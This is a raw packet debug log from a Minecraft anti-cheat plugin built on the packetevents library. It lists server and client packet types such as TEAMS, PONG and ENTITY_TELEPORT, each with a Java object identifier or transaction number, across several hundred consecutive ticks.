XH6WfubL?source=archive,Sniffed from funkemunky report,FunkemunkyDev,text,Friday 18th of September 2026 12:00:53 PM CDT,"[6087] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@784a93b6
[6087] PONG: TransactionClientWrapper{action=6086, id=0}
[6087] PONG: TransactionClientWrapper{action=6087, id=0}
[6087] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@75e85733
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5993ad1b
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2efdd87d
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@14452b88
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2323b7fc
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@679c3df6
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@27e23f48
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1ac64957
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@246481a4
[6087] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@22917b53
[6087] ENTITY_RELATIVE_MOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRelativeMove@14bf0836
(Silent) [6088] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@389970be
[6088] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c1b6707
(Silent) [6089] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1232cf18
[6089] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c72b881
[6089] PONG: TransactionClientWrapper{action=6088, id=0}
[6089] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@151007bf
[6089] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@79825393
[6089] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1ec630fb
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@37592512
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2261e1b9
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@499420ad
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@667a808c
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@187558e4
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@35b40e7a
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5dcdd129
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6f8154fc
[6089] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d018390
(Silent) [6090] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@2dd47a39
[6090] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@48538194
[6090] PONG: TransactionClientWrapper{action=6089, id=0}
(Silent) [6091] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@243fa5fd
[6091] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7ba4552e
[6091] PONG: TransactionClientWrapper{action=6090, id=0}
[6091] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1e67d812
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4fabc54d
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1b20a20d
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@42f48962
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@62737e66
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@73634ec8
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6d4dba63
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@b949131
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@726d5e6b
[6091] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1b114be0
(Silent) [6092] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@57d02d44
[6092] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1b8f7443
[6092] PONG: TransactionClientWrapper{action=6091, id=0}
(Silent) [6093] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@531e62a9
[6093] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@343d731a
[6093] PONG: TransactionClientWrapper{action=6092, id=0}
[6093] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2cbbfdf0
[6093] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3d64edcc
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d29ab4f
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2d3a653
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@71f48f84
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6be406fb
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7b87ab1b
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@64f97b06
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@31a440b2
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7a3c4ba3
[6093] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3ca5e88c
(Silent) [6094] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@5d95cf41
[6094] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@13ab8555
[6094] PLAYER_INPUT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientPlayerInput@19f642
[6094] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@78039545
[6094] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3194ff32
[6094] PONG: TransactionClientWrapper{action=6093, id=0}
[6094] PONG: TransactionClientWrapper{action=6094, id=0}
(Silent) [6095] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@4dc9943
[6095] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@41c57133
[6095] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@cb7fa85
[6095] PONG: TransactionClientWrapper{action=6095, id=0}
[6095] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@31491ec
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3740634b
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d66d079
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6eb67a82
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@490a1d49
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7de47518
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@16ea97c5
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4b559df0
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@52ac3186
[6095] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@c3ed27e
(Silent) [6096] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@52b02e91
[6096] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@29bdee77
[6096] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1e7a60bc
[6096] PONG: TransactionClientWrapper{action=6096, id=0}
(Silent) [6097] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@729b1544
[6097] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fc6a7ba
[6097] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6be4d212
[6097] PONG: TransactionClientWrapper{action=6097, id=0}
[6097] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3518c399
[6097] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2a47e490
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@60766d15
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2d4f474b
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5e385d70
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4b4e4143
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@180383fa
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4fa1faae
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@536efdf7
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6a93ea80
[6097] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6e0bb87b
(Silent) [6098] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1872391
[6098] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@439e0a2d
[6098] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6dc5c813
[6098] PONG: TransactionClientWrapper{action=6098, id=0}
[6098] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@5d3586c8
(Silent) [6099] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@6171b463
[6099] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@be27a95
[6099] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@75e3e15d
[6099] PONG: TransactionClientWrapper{action=6099, id=0}
[6099] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@361d8f7e
[6099] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2bbe3ad2
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3390dbe2
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@59933dc4
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3af3ff7
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@591dedfa
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6ce762f0
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2cda1fb5
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5670dd5e
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@60b49857
[6099] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@37939653
[6099] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4bc800a3
[6099] BUNDLE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1b82bea9
[6099] SPAWN_ENTITY: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerSpawnEntity@5fb0fbae
[6099] ENTITY_METADATA: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityMetadata@743acf05
(Silent) [6100] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@32e6ca7a
[6100] UPDATE_ATTRIBUTES: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerUpdateAttributes@7ffc1439
[6100] ENTITY_EQUIPMENT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@71059a99
[6100] BUNDLE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2930629c
[6100] ENTITY_POSITION_SYNC: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityPositionSync@bd0d258
[6100] ENTITY_METADATA: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityMetadata@141252c7
[6100] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5b2fb261
[6100] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@78520e0a
[6100] PONG: TransactionClientWrapper{action=6100, id=0}
[6100] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@516754d
[6100] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c10017d
[6100] ENTITY_ROTATION: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityRotation@1a0a0024
[6100] ENTITY_HEAD_LOOK: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@72406f31
[6100] ENTITY_ANIMATION: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@444ad029
(Silent) [6101] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@18fdd857
[6101] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2fc0cd23
[6101] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1cab2c6d
[6101] PONG: TransactionClientWrapper{action=6101, id=0}
[6101] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@9efa7da
[6101] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@7b06e9b7
[6101] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@52069a21
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@178b0c48
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@632eb814
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2f29be97
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4918eec1
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@63e42e6
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1046a42d
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@72797db4
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7c99ebdc
[6101] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@8c4bfdb
(Silent) [6102] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@205efb72
[6102] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6561936a
[6102] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2cfe7f63
[6102] PONG: TransactionClientWrapper{action=6102, id=0}
(Silent) [6103] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@4ce091b6
[6103] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2ef67f25
[6103] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@55caa944
[6103] PONG: TransactionClientWrapper{action=6103, id=0}
[6103] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@23e9df16
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@62fb3b3c
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7fe96f11
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7f696921
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@121518b5
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@298ce310
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1d2980d7
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@293dd232
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1357a710
[6103] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5d0d5209
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@cf35e47
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4b18b1a9
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@65d9f0fd
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@52f36b55
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4464062a
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4a7f72f6
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@600b3d5c
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@296b5bcb
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4dda4d9a
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7c836e15
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@455b4d04
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@361de367
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2934cea3
[6103] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4e20ee56
(Silent) [6104] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@7447d03a
[6104] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@510cb9fb
[6104] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@8d36e66
[6104] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@79de809
[6104] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4e86f4f2
[6104] PLAYER_INFO_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7a714fb8
[6104] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@198ed78e
[6104] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@626f6123
[6104] PONG: TransactionClientWrapper{action=6104, id=0}
[6104] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@6b9fa2e1
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@58d27b83
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@370fe5b0
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@2e70ec0b
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@38eedb8e
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@732ba173
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3bc1e8c3
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@12f85b04
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5c04d07e
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@720ac2b4
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4639bbc6
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1649f87e
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6cb44de9
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@488f2da9
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@436358f5
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@1a30c2ef
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@54a51f45
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@65f6921d
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3c8bdaa6
[6104] PLAYER_INFO_REMOVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@20304062
[6104] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5c133c16
(Silent) [6105] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@6945fc5e
[6105] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5996f166
[6105] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@69fbb8b7
[6105] PONG: TransactionClientWrapper{action=6105, id=0}
[6105] TIME_UPDATE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6a55d43c
[6105] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@6783db14
[6105] SCOREBOARD_OBJECTIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@9701b43
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@3d7a24da
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@794ae37d
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@e8dc3b
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@9cb7566
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@657bcc71
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@4b849aa8
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@dcb8ee7
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5f79ba7d
[6105] TEAMS: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@64daeda7
(Silent) [6106] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1a6e5a55
[6106] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerKeepAlive@b647a4e
[6106] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@5a097173
[6106] PLAYER_INPUT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientPlayerInput@4831921d
[6106] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@49a141bd
[6106] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@7652799c
[6106] KEEP_ALIVE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientKeepAlive@624a9d24
[6106] PONG: TransactionClientWrapper{action=6106, id=0}
[6106] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@229f37cf
(Silent) [6107] dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPing@1e6d10f8
[6107] CLIENT_TICK_END: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@45e45c84
[6107] SYSTEM_CHAT_MESSAGE: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.PacketWrapper@6f88d49d
[6107] PONG: TransactionClientWrapper{action=6107, id=0}
[6107] ENTITY_TELEPORT: dev.brighten.ac.libs.com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityTeleport@18ae2a6f
